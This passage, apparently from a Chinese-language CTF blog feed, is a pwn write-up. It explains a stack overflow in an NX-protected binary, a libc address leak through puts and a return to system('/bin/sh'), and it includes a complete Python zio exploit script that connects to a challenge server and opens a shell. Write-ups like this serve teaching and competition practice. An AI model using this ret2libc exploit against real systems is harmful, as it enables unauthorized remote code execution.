alt=&quot;pwn4.5&quot;&gt;&lt;br&gt;&lt;img src=&quot;/img/post/pwn4_6.png&quot; alt=&quot;pwn4.6&quot;&gt;&lt;br&gt;可以看到成功溢出了，程序开了NX，那接下来的思路就和上一题差不多了。但我们不能像上一题那样直接跳到&lt;code&gt;read&lt;/code&gt;函数，因为这个输入使用的&lt;code&gt;getc&lt;/code&gt;，当时思路到这就断了，于是尝试其他方法。&lt;br&gt;我的思路一开始还是那样：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;1.溢出，返回到put函数，并把字符串指针指向&lt;code&gt;libc_start_main&lt;/code&gt;&lt;br&gt;2.打印出libc地址，接下来就stuck了&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;于是开始想怎么返回到getc并把eax的值放到指定地址，想不出来，好吧，先试试跑一下脚本看对不对，跑着跑着就发现，alsr的随机范围并不大，大概只随机了两个字节。嘿嘿，那就暴力跑一下呗，然而由于payload的原因（这是后来才知道的）一直跑不出来。于是问z神，好吧，只要返回到程序开头就行了，那样的话就能重新开一遍程序T-T，先试了下执行exev(“/bin/sh”)，大概是寄存器原因，无果。那只能返回system了，成功！&lt;br&gt;&lt;img src=&quot;/img/post/pwn4_7.png&quot; alt=&quot;pwn4.7&quot;&gt;&lt;br&gt;附上脚本&lt;br&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; zio&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; time&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;target = (&lt;span class=&quot;string&quot;&gt;&#39;121.42.25.113&#39;&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;10004&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;a=zio.zio(target)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;payload = &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;payload+=&lt;span class=&quot;string&quot;&gt;&#39;http://%&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;payload+=&lt;span class=&quot;string&quot;&gt;&#39;\x00&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;payload+=(&lt;span class=&quot;number&quot;&gt;0x9C&lt;/span&gt;-&lt;span class=&quot;number&quot;&gt;7&lt;/span&gt;)*&lt;span class=&quot;string&quot;&gt;&#39;a&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;payload+=zio.l32(&lt;span class=&quot;number&quot;&gt;0x8048530&lt;/span&gt;) &lt;span class=&quot;comment&quot;&gt;#puts@plt&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;payload+=zio.l32(&lt;span class=&quot;number&quot;&gt;0x80487a4&lt;/span&gt;) &lt;span class=&quot;comment&quot;&gt;#popret&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;payload+=zio.l32(&lt;span class=&quot;number&quot;&gt;0x8049DFC&lt;/span&gt;) &lt;span class=&quot;comment&quot;&gt;#libc_start_main&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;payload+=zio.l32(&lt;span class=&quot;number&quot;&gt;0x8048616&lt;/span&gt;) &lt;span class=&quot;comment&quot;&gt;#start&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;payload+=&lt;span class=&quot;string&quot;&gt;&#39;\x0a&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;a.read_until(&lt;span class=&quot;string&quot;&gt;&#39;L: &#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;a.write(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;a.readline()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tm = a.read(&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tm = tm[::-&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tm = tm.encode(&lt;span class=&quot;string&quot;&gt;&#39;hex&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tm = int(tm,&lt;span class=&quot;number&quot;&gt;16&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;[*]libc_start_main is %x&#39;&lt;/span&gt;%tm&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;SYS = tm-&lt;span class=&quot;number&quot;&gt;0x19970&lt;/span&gt;+ &lt;span class=&quot;number&quot;&gt;0x3FCD0&lt;/span&gt;    &lt;span class=&quot;comment&quot;&gt;#system&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Exit = tm -&lt;span class=&quot;number&quot;&gt;0x19970&lt;/span&gt;+&lt;span class=&quot;number&quot;&gt;0x32EC0&lt;/span&gt;   &lt;span class=&quot;comment&quot;&gt;#exit&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;bins = tm - &lt;span class=&quot;number&quot;&gt;0x19970&lt;/span&gt;+&lt;span class=&quot;number&quot;&gt;0x15DA84&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;#/bin/sh&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;[*]RCE is %x&#39;&lt;/span&gt;%SYS&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;payload2 = &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;payload2+=&lt;span class=&quot;string&quot;&gt;&#39;http://%&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;payload2+=&lt;span class=&quot;string&quot;&gt;&#39;\x00&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;payload2+=(&lt;span class=&quot;number&quot;&gt;0x9C&lt;/span&gt;-&lt;span class=&quot;number&quot;&gt;7&lt;/span&gt;)*&lt;span class=&quot;string&quot;&gt;&#39;a&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;payload2+=zio.l32(SYS)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;payload2+=zio.l32(Exit)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;payload2+=zio.l32(bins)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;payload2+=&lt;span class=&quot;string&quot;&gt;&#39;\x0a&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;time.sleep(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;a.read_until(&lt;span class=&quot;string&quot;&gt;&#39;L: &#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;a.write(payload2)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;Get shell!&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;a.interact()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;还有，为什么没人做pwn题啊QAQ 多好玩&lt;br&gt;对了，还顺便留了点东西，我知道你们没人看[滑稽]&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;wp&lt;br&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="http://spinee.gitcafe.io/tags/ctf/"/>
    
  </entry>
  
</feed>
